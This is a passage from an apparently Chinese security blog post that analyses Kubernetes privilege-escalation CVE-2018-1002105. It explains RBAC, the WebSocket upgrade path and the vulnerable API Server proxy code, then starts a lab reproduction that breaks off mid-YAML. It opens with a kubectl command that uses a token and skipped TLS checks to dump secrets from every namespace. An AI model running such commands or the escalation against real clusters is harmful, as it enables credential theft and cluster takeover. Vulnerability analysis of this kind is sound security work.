<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash">kubectl --insecure-skip-tls-verify<span class="o">=</span><span class="nb">true</span> --server<span class="o">=</span><span class="s2">&#34;https://ip:6443&#34;</span> --token<span class="o">=</span><span class="s2">&#34;eyJhbG......&#34;</span> get secrets --all-namespaces
</code></pre></td></tr></table>
</div>
</div><h2 id="3-k8s-权限提升漏洞---cve-2018-1002105">3 k8s 权限提升漏洞 - CVE-2018-1002105</h2>
<blockquote>
<p>CVE-2018-1002105 是一个 Kubernetes 的权限提升漏洞，允许攻击者在拥有集群内低权限的情况下提升权限至 Kubernetes API Server 权限，CVSS 3.x 评分为 9.8。</p>
</blockquote>
<p>影响版本：</p>
<ul>
<li>Kubernetes v1.0.x-1.9.x</li>
<li>Kubernetes v1.10.0-1.10.10 (fixed in v1.10.11)</li>
<li>Kubernetes v1.11.0-1.11.4 (fixed in v1.11.5)</li>
<li>Kubernetes v1.12.0-1.12.2 (fixed in v1.12.3)</li>
</ul>
<p>简单来说，通过构造一个特殊的请求，攻击者能够借助 Kubernetes API Server 作为代理，建立一个到后端服务器的连接，进而以 Kubernetes API Server 的身份向后端服务器发送任意请求，实质上就是权限提升。</p>
<p>在多数环境下，为了成功利用漏洞，攻击者本身需要具备一定的权限，如对集群内一个 Pod 的 exec、attach 权限。然而，在集群中存在其他扩展 API Server (如 metrics-server)的情况下，只要允许匿名访问集群，攻击者就可能以置名用户的身份完成漏洞利用。</p>
<h3 id="31-背景">3.1 背景</h3>
<h4 id="311-基于角色的访问控制---rbac">3.1.1 基于角色的访问控制 - RBAC</h4>
<p>Role-Based Access Control(RBAC) 是为不同用户赋予不同的角色，通过角色授权进行访问控制。要启用 RBAC，在启动 <a href="https://kubernetes.io/zh/docs/reference/command-line-tools-reference/kube-apiserver/" target="_blank" rel="noopener noreffer">API  Server</a> 时设置 <code>--authorization-mode</code> 参数。</p>
<p>Kubernetes 提供了四种 RBAC 对象：Role、ClusterRole、Role Binding 和  ClusterRoleBinding。</p>
<p>其中，Role 和 ClusterRole 代表一系列权限的集合，一个 Role 资源通常是特定命名空间内某些权限的集合，ClusterRole 则是无命名空间限制的资源。</p>
<p>以<a href="https://kubernetes.io/zh/docs/reference/access-authn-authz/rbac/" target="_blank" rel="noopener noreffer">官方文档</a>中的例子，下面是一个 Role 的声明文件，它在默认的命名空间创建了一个名为 <code>pod-reader</code> 的角色，这角色的权限是能够对命名空间内部的 Pod 进行查看、事件监听和列举操作。</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span><span class="lnt">3
</span><span class="lnt">4
</span><span class="lnt">5
</span><span class="lnt">6
</span><span class="lnt">7
</span><span class="lnt">8
</span><span class="lnt">9
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-yaml" data-lang="yaml"><span class="nt">apiVersion</span><span class="p">:</span><span class="w"> </span><span class="l">rbac.authorization.k8s.io/v1</span><span class="w">
</span><span class="w"></span><span class="nt">kind</span><span class="p">:</span><span class="w"> </span><span class="l">Role</span><span class="w">
</span><span class="w"></span><span class="nt">metadata</span><span class="p">:</span><span class="w">
</span><span class="w">  </span><span class="nt">namespace</span><span class="p">:</span><span class="w"> </span><span class="l">default</span><span class="w">
</span><span class="w">  </span><span class="nt">name</span><span class="p">:</span><span class="w"> </span><span class="l">pod-reader</span><span class="w">
</span><span class="w"></span><span class="nt">rules</span><span class="p">:</span><span class="w">
</span><span class="w"></span>- <span class="nt">apiGroups</span><span class="p">:</span><span class="w"> </span><span class="p">[</span><span class="s2">&#34;&#34;</span><span class="p">]</span><span class="w"> </span><span class="c"># &#34;&#34; 标明 core API 组</span><span class="w">
</span><span class="w">  </span><span class="nt">resources</span><span class="p">:</span><span class="w"> </span><span class="p">[</span><span class="s2">&#34;pods&#34;</span><span class="p">]</span><span class="w">
</span><span class="w">  </span><span class="nt">verbs</span><span class="p">:</span><span class="w"> </span><span class="p">[</span><span class="s2">&#34;get&#34;</span><span class="p">,</span><span class="w"> </span><span class="s2">&#34;watch&#34;</span><span class="p">,</span><span class="w"> </span><span class="s2">&#34;list&#34;</span><span class="p">]</span><span class="w">
</span></code></pre></td></tr></table>
</div>
</div><p><code>RoleBinding</code> 和 <code>ClusterRoleBinding</code> 则用来将 <code>Role</code> 和 <code>ClusterRole</code> 定义的权限赋予一个或一组特定的用户。</p>
<p>下面的例子中的 <code>RoleBinding</code> 将 <code>pod-reader</code> Role 授予在 <code>default</code> 命名空间中的用户 <code>jane</code>。 这样，用户 jane 就具有了读取 <code>default</code> 命名空间中 pods 的权限。</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span><span class="lnt">13
</span><span class="lnt">14
</span><span class="lnt">15
</span><span class="lnt">16
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-yaml" data-lang="yaml"><span class="nt">apiVersion</span><span class="p">:</span><span class="w"> </span><span class="l">rbac.authorization.k8s.io/v1</span><span class="w">
</span><span class="w"></span><span class="c"># 此角色绑定允许 &#34;jane&#34; 读取 &#34;default&#34; 名字空间中的 Pods</span><span class="w">
</span><span class="w"></span><span class="nt">kind</span><span class="p">:</span><span class="w"> </span><span class="l">RoleBinding</span><span class="w">
</span><span class="w"></span><span class="nt">metadata</span><span class="p">:</span><span class="w">
</span><span class="w">  </span><span class="nt">name</span><span class="p">:</span><span class="w"> </span><span class="l">read-pods</span><span class="w">
</span><span class="w">  </span><span class="nt">namespace</span><span class="p">:</span><span class="w"> </span><span class="l">default</span><span class="w">
</span><span class="w"></span><span class="nt">subjects</span><span class="p">:</span><span class="w">
</span><span class="w"></span><span class="c"># 你可以指定不止一个“subject（主体）”</span><span class="w">
</span><span class="w"></span>- <span class="nt">kind</span><span class="p">:</span><span class="w"> </span><span class="l">User</span><span class="w">
</span><span class="w">  </span><span class="nt">name</span><span class="p">:</span><span class="w"> </span><span class="l">jane</span><span class="w"> </span><span class="c"># &#34;name&#34; 是区分大小写的</span><span class="w">
</span><span class="w">  </span><span class="nt">apiGroup</span><span class="p">:</span><span class="w"> </span><span class="l">rbac.authorization.k8s.io</span><span class="w">
</span><span class="w"></span><span class="nt">roleRef</span><span class="p">:</span><span class="w">
</span><span class="w">  </span><span class="c"># &#34;roleRef&#34; 指定与某 Role 或 ClusterRole 的绑定关系</span><span class="w">
</span><span class="w">  </span><span class="nt">kind</span><span class="p">:</span><span class="w"> </span><span class="l">Role</span><span class="w"> </span><span class="c"># 此字段必须是 Role 或 ClusterRole</span><span class="w">
</span><span class="w">  </span><span class="nt">name</span><span class="p">:</span><span class="w"> </span><span class="l">pod-reader    </span><span class="w"> </span><span class="c"># 此字段必须与你要绑定的 Role 或 ClusterRole 的名称匹配</span><span class="w">
</span><span class="w">  </span><span class="nt">apiGroup</span><span class="p">:</span><span class="w"> </span><span class="l">rbac.authorization.k8s.io</span><span class="w">
</span></code></pre></td></tr></table>
</div>
</div><h4 id="312-websocket">3.1.2 WebSocket</h4>
<p><a href="https://zh.wikipedia.org/wiki/WebSocket" target="_blank" rel="noopener noreffer">WebSocket</a> 是一种网络传输协议，可在单个 TCP 连接上进行全双工通信，使得客户端和服务器之间的数据交换变得更加简单，允许服务端主动向客户端推送数据。在 WebSocket API中，浏览器和服务器只需要完成一次握手，两者之间就可以创建持久性的连接，并进行双向数据传输。</p>
<p>一个典型的 Websocket 握手请求如下：</p>
<p>客户端请求：</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span><span class="lnt">3
</span><span class="lnt">4
</span><span class="lnt">5
</span><span class="lnt">6
</span><span class="lnt">7
</span><span class="lnt">8
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-http" data-lang="http"><span class="nf">GET</span> <span class="nn">/chat</span> <span class="kr">HTTP</span><span class="o">/</span><span class="m">1.1</span>
<span class="n">Host</span><span class="o">:</span> <span class="l">server.example.com</span>
<span class="n">Upgrade</span><span class="o">:</span> <span class="l">websocket</span>
<span class="n">Connection</span><span class="o">:</span> <span class="l">Upgrade</span>
<span class="n">Sec-WebSocket-Key</span><span class="o">:</span> <span class="l">dGhlIHNhbXBsZSBub25jZQ==</span>
<span class="n">Origin</span><span class="o">:</span> <span class="l">http://example.com</span>
<span class="n">Sec-WebSocket-Protocol</span><span class="o">:</span> <span class="l">chat, superchat</span>
<span class="n">Sec-WebSocket-Version</span><span class="o">:</span> <span class="l">13</span>
</code></pre></td></tr></table>
</div>
</div><p>服务器回应：</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span><span class="lnt">3
</span><span class="lnt">4
</span><span class="lnt">5
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-http" data-lang="http"><span class="kr">HTTP</span><span class="o">/</span><span class="m">1.1</span> <span class="m">101</span> <span class="ne">Switching Protocols</span>
<span class="n">Upgrade</span><span class="o">:</span> <span class="l">websocket</span>
<span class="n">Connection</span><span class="o">:</span> <span class="l">Upgrade</span>
<span class="n">Sec-WebSocket-Accept</span><span class="o">:</span> <span class="l">s3pPLMBiTxaQ9kYGzzhZRbK+xOo=</span>
<span class="n">Sec-WebSocket-Protocol</span><span class="o">:</span> <span class="l">chat</span>
</code></pre></td></tr></table>
</div>
</div><h4 id="313-kubernetes-api-server">3.1.3 Kubernetes API Server</h4>
<p>API Server 通过 RESTful API 提供服务。除此之外，它还具有代理转发的功能，将外界对于部分 API的调用转发到后端实际执行这些 API 功能的组件上。例如，常用的对 pod 执行 exec 的操作就是 API Server 作为代理，将请求转发到对应节点的 Kubelet 上，由该 Kubelet 执行具体命令。这个过程还涉及从 HTTP 到 Websocket 的协议升级过程，API Server 能够作为代理维护一条 WebSocket 连接。</p>
<h3 id="32-分析">3.2 分析</h3>
<p>漏洞在 <code>staging/src/k8s.io/apimachinery/pkg/util/proxy/upgradeaware.go</code> 中。<code>upgradeaware</code> 主要处理 API Server 的代理逻辑。其中 ServerHTTP 函数用来处理代理请求。</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span><span class="lnt">13
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-go" data-lang="go"><span class="c1">// staging/src/k8s.io/apimachinery/pkg/util/proxy/upgradeaware.go 
</span><span class="c1">// ServeHTTP handles the proxy request
</span><span class="c1"></span><span class="kd">func</span> <span class="p">(</span><span class="nx">h</span> <span class="o">*</span><span class="nx">UpgradeAwareHandler</span><span class="p">)</span> <span class="nf">ServeHTTP</span><span class="p">(</span><span class="nx">w</span> <span class="nx">http</span><span class="p">.</span><span class="nx">ResponseWriter</span><span class="p">,</span> <span class="nx">req</span> <span class="o">*</span><span class="nx">http</span><span class="p">.</span><span class="nx">Request</span><span class="p">)</span> <span class="p">{</span>
	<span class="k">if</span> <span class="nx">h</span><span class="p">.</span><span class="nf">tryUpgrade</span><span class="p">(</span><span class="nx">w</span><span class="p">,</span> <span class="nx">req</span><span class="p">)</span> <span class="p">{</span>
		<span class="k">return</span>
	<span class="p">}</span>
	<span class="k">if</span> <span class="nx">h</span><span class="p">.</span><span class="nx">UpgradeRequired</span> <span class="p">{</span>
		<span class="nx">h</span><span class="p">.</span><span class="nx">Responder</span><span class="p">.</span><span class="nf">Error</span><span class="p">(</span><span class="nx">w</span><span class="p">,</span> <span class="nx">req</span><span class="p">,</span> <span class="nx">errors</span><span class="p">.</span><span class="nf">NewBadRequest</span><span class="p">(</span><span class="s">&#34;Upgrade request required&#34;</span><span class="p">))</span>
		<span class="k">return</span>
	<span class="p">}</span>
  <span class="o">...</span>
	<span class="p">}</span>
<span class="p">}</span>
</code></pre></td></tr></table>
</div>
</div><p>它在最开始调用了 <code>tryUpgrade</code> 函数，尝试进行协议升级。漏洞正存在于该函数的处理逻辑之中，跟进该函数。</p>
<p>首先，该函数要判断原始请求是否为协议升级请求（请求头中是否包含 Connection 和 Upgrade 项）：</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span><span class="lnt">3
</span><span class="lnt">4
</span><span class="lnt">5
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-go" data-lang="go"><span class="c1">// tryUpgrade returns true if the request was handled.
</span><span class="c1"></span><span class="k">if</span> <span class="p">!</span><span class="nx">httpstream</span><span class="p">.</span><span class="nf">IsUpgradeRequest</span><span class="p">(</span><span class="nx">req</span><span class="p">)</span> <span class="p">{</span>
	<span class="nx">glog</span><span class="p">.</span><span class="nf">V</span><span class="p">(</span><span class="mi">6</span><span class="p">).</span><span class="nf">Infof</span><span class="p">(</span><span class="s">&#34;Request was not an upgrade&#34;</span><span class="p">)</span>
	<span class="k">return</span> <span class="kc">false</span>
<span class="p">}</span>
</code></pre></td></tr></table>
</div>
</div><p>接着，它建立了到后端服务的连接：</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span><span class="lnt">13
</span><span class="lnt">14
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-go" data-lang="go"><span class="k">if</span> <span class="nx">h</span><span class="p">.</span><span class="nx">InterceptRedirects</span> <span class="p">{</span>
	<span class="nx">glog</span><span class="p">.</span><span class="nf">V</span><span class="p">(</span><span class="mi">6</span><span class="p">).</span><span class="nf">Infof</span><span class="p">(</span><span class="s">&#34;Connecting to backend proxy (intercepting redirects) %s\n  Headers: %v&#34;</span><span class="p">,</span> <span class="o">&amp;</span><span class="nx">location</span><span class="p">,</span> <span class="nx">clone</span><span class="p">.</span><span class="nx">Header</span><span class="p">)</span>
	<span class="nx">backendConn</span><span class="p">,</span> <span class="nx">rawResponse</span><span class="p">,</span> <span class="nx">err</span> <span class="p">=</span> <span class="nx">utilnet</span><span class="p">.</span><span class="nf">ConnectWithRedirects</span><span class="p">(</span><span class="nx">req</span><span class="p">.</span><span class="nx">Method</span><span class="p">,</span> <span class="o">&amp;</span><span class="nx">location</span><span class="p">,</span> <span class="nx">clone</span><span class="p">.</span><span class="nx">Header</span><span class="p">,</span> <span class="nx">req</span><span class="p">.</span><span class="nx">Body</span><span class="p">,</span> <span class="nx">utilnet</span><span class="p">.</span><span class="nf">DialerFunc</span><span class="p">(</span><span class="nx">h</span><span class="p">.</span><span class="nx">DialForUpgrade</span><span class="p">),</span> <span class="nx">h</span><span class="p">.</span><span class="nx">RequireSameHostRedirects</span><span class="p">)</span>
<span class="p">}</span> <span class="k">else</span> <span class="p">{</span>
	<span class="nx">glog</span><span class="p">.</span><span class="nf">V</span><span class="p">(</span><span class="mi">6</span><span class="p">).</span><span class="nf">Infof</span><span class="p">(</span><span class="s">&#34;Connecting to backend proxy (direct dial) %s\n  Headers: %v&#34;</span><span class="p">,</span> <span class="o">&amp;</span><span class="nx">location</span><span class="p">,</span> <span class="nx">clone</span><span class="p">.</span><span class="nx">Header</span><span class="p">)</span>
	<span class="nx">clone</span><span class="p">.</span><span class="nx">URL</span> <span class="p">=</span> <span class="o">&amp;</span><span class="nx">location</span>
	<span class="nx">backendConn</span><span class="p">,</span> <span class="nx">err</span> <span class="p">=</span> <span class="nx">h</span><span class="p">.</span><span class="nf">DialForUpgrade</span><span class="p">(</span><span class="nx">clone</span><span class="p">)</span>
<span class="p">}</span>
<span class="k">if</span> <span class="nx">err</span> <span class="o">!=</span> <span class="kc">nil</span> <span class="p">{</span>
	<span class="nx">glog</span><span class="p">.</span><span class="nf">V</span><span class="p">(</span><span class="mi">6</span><span class="p">).</span><span class="nf">Infof</span><span class="p">(</span><span class="s">&#34;Proxy connection error: %v&#34;</span><span class="p">,</span> <span class="nx">err</span><span class="p">)</span>
	<span class="nx">h</span><span class="p">.</span><span class="nx">Responder</span><span class="p">.</span><span class="nf">Error</span><span class="p">(</span><span class="nx">w</span><span class="p">,</span> <span class="nx">req</span><span class="p">,</span> <span class="nx">err</span><span class="p">)</span>
	<span class="k">return</span> <span class="kc">true</span>
<span class="p">}</span>
<span class="k">defer</span> <span class="nx">backendConn</span><span class="p">.</span><span class="nf">Close</span><span class="p">()</span>
</code></pre></td></tr></table>
</div>
</div><p>然后，<code>tryUpgrade</code> 函数进行了 HTTP Hijack 操作，简单来说，就是不再将 HTTP 连接处理委托给 Go 语言内置的处理流程，程序自身在 TCP 连接基础上进行 HTTP 交互，这是从 HTTP 升级到 WebSocket 的关键步骤之一：</p>
<p><img
        class="lazyload"
        src="/svg/loading.min.svg"
        data-src="https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/202112021544857.png-water_print"
        data-srcset="https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/202112021544857.png-water_print, https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/202112021544857.png-water_print 1.5x, https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/202112021544857.png-water_print 2x"
        data-sizes="auto"
        alt="https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/202112021544857.png-water_print"
        title="https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/202112021544857.png-water_print" /></p>
<p>随后，tryUpgrade 将后端针对上一次请求的响应返回给客户端：</p>
<p><img
        class="lazyload"
        src="/svg/loading.min.svg"
        data-src="https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/202112021545502.png-water_print"
        data-srcset="https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/202112021545502.png-water_print, https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/202112021545502.png-water_print 1.5x, https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/202112021545502.png-water_print 2x"
        data-sizes="auto"
        alt="https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/202112021545502.png-water_print"
        title="https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/202112021545502.png-water_print" /></p>
<p>函数的最后，客户端到后端服务的代理通道被建立起来。</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span><span class="lnt">13
</span><span class="lnt">14
</span><span class="lnt">15
</span><span class="lnt">16
</span><span class="lnt">17
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-go" data-lang="go"><span class="c1">// Proxy the connection.
</span><span class="c1"></span><span class="nx">writerComplete</span> <span class="o">:=</span> <span class="nb">make</span><span class="p">(</span><span class="kd">chan</span> <span class="kd">struct</span><span class="p">{})</span>
<span class="nx">readerComplete</span> <span class="o">:=</span> <span class="nb">make</span><span class="p">(</span><span class="kd">chan</span> <span class="kd">struct</span><span class="p">{})</span>
<span class="k">go</span> <span class="kd">func</span><span class="p">()</span> <span class="p">{</span>
  <span class="o">...</span>
<span class="p">}()</span>
<span class="k">go</span> <span class="kd">func</span><span class="p">()</span> <span class="p">{</span>
  <span class="o">...</span>
<span class="p">}()</span>
<span class="c1">// Wait for one half the connection to exit. Once it does the defer will
</span><span class="c1">// clean up the other half of the connection.
</span><span class="c1"></span><span class="k">select</span> <span class="p">{</span>
	<span class="k">case</span> <span class="o">&lt;-</span><span class="nx">writerComplete</span><span class="p">:</span>
	<span class="k">case</span> <span class="o">&lt;-</span><span class="nx">readerComplete</span><span class="p">:</span>
<span class="p">}</span>
<span class="nx">glog</span><span class="p">.</span><span class="nf">V</span><span class="p">(</span><span class="mi">6</span><span class="p">).</span><span class="nf">Infof</span><span class="p">(</span><span class="s">&#34;Disconnecting from backend proxy %s\n  Headers: %v&#34;</span><span class="p">,</span> <span class="o">&amp;</span><span class="nx">location</span><span class="p">,</span> <span class="nx">clone</span><span class="p">.</span><span class="nx">Header</span><span class="p">)</span>
<span class="k">return</span> <span class="kc">true</span>
</code></pre></td></tr></table>
</div>
</div><p>这是 API Server 视角下建立代理的流程。那么，在这个过程中，后端服务又是如何参与的呢？</p>
<p>以 Kubelet 为例，当用户对某个 Pod 执行 exec 操作时，该请求经过上面 API Server 的代理，发给 Kubelet。 Kubelet 在初始化时会启动一个自己的 API Server（为便于区分，后文所有单独出现的 API Server 均指的是 Kubernetes API Server，用 Kubelet API Server 指代 Kubelet 内部的 API Server)。</p>
<p>Kubelet 启动时会注册一系列 API，<code>/exec</code> 就在其中（由 <code>installDebuggingHandlers</code> 函数注册），注朋的对应处理函数为：</p>
<p>具体代码如下：<code>pkg/kubelet/server/server.go</code></p>
<p><img
        class="lazyload"
        src="/svg/loading.min.svg"
        data-src="https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/202112021600563.png-water_print"
        data-srcset="https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/202112021600563.png-water_print, https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/202112021600563.png-water_print 1.5x, https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/202112021600563.png-water_print 2x"
        data-sizes="auto"
        alt="https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/202112021600563.png-water_print"
        title="https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/202112021600563.png-water_print" /></p>
<p>当客户端发起一个对 Pod 执行 exec 操作的请求时，经过 API Server 的代理、Kubelet 的转发，最终客户端与 Pod 间建立起了连接。</p>
<p>问题可能出现在如下地方：</p>
<ol>
<li>如果请求本身不具有相应 Pod 的操作权限，它在 API Server 环节就会被拦截下来，不会到达 Kubelet，这个处理没有问题。</li>
<li>如果请求本身具有相应 Pod 的操作权限，且请求符合 API 要求（URL 正确、参数齐全等)，API Server 建立起代理，Kubelet 将流量转发到 Pod 上，一条客户端到指定 Pod 的命令执行连接被建立，这也没有问题，因为客户端本身具有相应 Pod 的操作权限。</li>
<li>如果请求本身具有相应 Pod 的操作权限，但是发出的请求并不符合 API 要求（如参数指定错误等)，API Server 同样会建立起代理，将请求转发给 Kubelet，这种情况下会发生什么呢？</li>
</ol>
<p>上面代码的 694 行，在 Kubelet 的 <code>/exec</code> 处理函数 <code>getExec</code> 中，一个 Options 实例被创建，跟进 <code>NewOptions</code> 函数：<code>pkg/kubelet/server/remotecommand/httpstream.go</code></p>
<p><img
        class="lazyload"
        src="/svg/loading.min.svg"
        data-src="https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/202112021616730.png-water_print"
        data-srcset="https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/202112021616730.png-water_print, https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/202112021616730.png-water_print 1.5x, https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/202112021616730.png-water_print 2x"
        data-sizes="auto"
        alt="https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/202112021616730.png-water_print"
        title="https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/202112021616730.png-water_print" /></p>
<p>在第 61 行，如果请求中 <code>stdin</code>、<code>stdout</code> 和 <code>stderr</code> 三个参数都没有给出，Options 实例将创建失败，<code>getExec</code> 函数将直接返回给客户端一个 http.StatusBadRequest 信息：</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span><span class="lnt">3
</span><span class="lnt">4
</span><span class="lnt">5
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-go" data-lang="go"><span class="k">if</span> <span class="nx">err</span> <span class="o">!=</span> <span class="kc">nil</span> <span class="p">{</span>
		<span class="nx">utilruntime</span><span class="p">.</span><span class="nf">HandleError</span><span class="p">(</span><span class="nx">err</span><span class="p">)</span>
		<span class="nx">response</span><span class="p">.</span><span class="nf">WriteError</span><span class="p">(</span><span class="nx">http</span><span class="p">.</span><span class="nx">StatusBadRequest</span><span class="p">,</span> <span class="nx">err</span><span class="p">)</span>
		<span class="k">return</span>
<span class="p">}</span>
</code></pre></td></tr></table>
</div>
</div><p>回到上面的第三种情况。结合 <code>API Server</code> 中 <code>tryUpgrade</code> 代码可以发现，<code>API Server</code> 并没有对这种错误情况进行处理，依然通过两个 <code>Goroutine</code> 为客户端到 <code>Kubelet</code> 建立了 <code>Websocket</code> 连接。问题的核心在于，这个连接并没有对接到某个 <code>Pod</code> 上（因为前面 <code>getExec</code> 失败返回了），也没有被销毁，客户端可以继续通过这个连接向 Kubelet 下发指令。由于经过了 <code>API Server</code> 的代理，因此指令是以 <code>API Server</code> 的权限向 <code>Kubelet</code> 下发的。也就是说，客户端自此能够自由向该 <code>Kubelet</code> 下发指令而不受限制，从而实现了权限提升，这就是 <code>CVE-2018-1002105</code> 漏洞的成因。</p>
<h3 id="33-复现">3.3 复现</h3>
<h4 id="331-前置条件">3.3.1 前置条件</h4>
<p>正常请求执行的链路是 <code>client --&gt; apiserver --&gt; kubelet</code></p>
<p>即 client 首先对 apiserver 发起请求，例如发送请求 [连接某一个容器并执行 exec] ，请求首先会被发到 apiserver，apiserver 收到请求后首先对该请求进行认证校验，如果此时使用的是匿名用户，api server 上是可以通过认证的，但会授权失败，即 client 只能走到 apiserver 而到不了 kubelet 就被返回 403 并断开连接了。</p>
<p>所以本次攻击的先决条件是，需要有一个可以从 client 到 apiserver 到 kubelet 整个链路通信认证通过的用户。</p>
<h4 id="332-漏洞环境搭建">3.3.2 漏洞环境搭建</h4>
<p>利用 <a href="https://github.com/Metarget/metarget" target="_blank" rel="noopener noreffer">metarget</a> 安装漏洞环境：</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash">./metarget cnv install cve-2018-1002105 --domestic
</code></pre></td></tr></table>
</div>
</div><p>模拟攻击场景：集群中存在一个 vul 的命名空间，其中存在一个运行的业务 Pod。攻击者具有 vul 命名空间下 Pod 的 exec 权限，但是不具有其它高级权限。通过该漏洞进行提权。</p>
<ul>
<li>创建 vul 命名空间</li>
</ul>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span><span class="lnt">3
</span><span class="lnt">4
</span><span class="lnt">5
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-yaml" data-lang="yaml"><span class="c"># cve_2018_1002105_namespace.yaml</span><span class="w">
</span><span class="w"></span><span class="nt">apiVersion</span><span class="p">:</span><span class="w"> </span><span class="l">v1</span><span class="w">
</span><span class="w"></span><span class="nt">kind</span><span class="p">:</span><span class="w"> </span><span class="l">Namespace</span><span class="w">
</span><span class="w"></span><span class="nt">metadata</span><span class="p">:</span><span class="w">
</span><span class="w">  </span><span class="nt">name</span><span class="p">:</span><span class="w"> </span><span class="l">vul</span><span class="w">
</span></code></pre></td></tr></table>
</div>
</div><ul>
<li>创建角色 test，并赋予权限</li>
</ul>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span><span class="lnt">13
</span><span class="lnt">14
</span><span class="lnt">15
</span><span class="lnt">16
</span><span class="lnt">17
</span><span class="lnt">18
</span><span class="lnt">19
</span><span class="lnt">20
</span><span class="lnt">21
</span><span class="lnt">22
</span><span class="lnt">23
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-yaml" data-lang="yaml"><span class="c"># cve_2018_1002105_role.yaml</span><span class="w">
</span><span class="w"></span><span class="nt">apiVersion</span><span class="p">:</span><span class="w"> </span><span class="l">rbac.authorization.k8s.io/v1</span><span class="w">
</span><span class="w"></span><span class="nt">kind</span><span class="p">:</span><span class="w"> </span><span class="l">Role</span><span class="w">
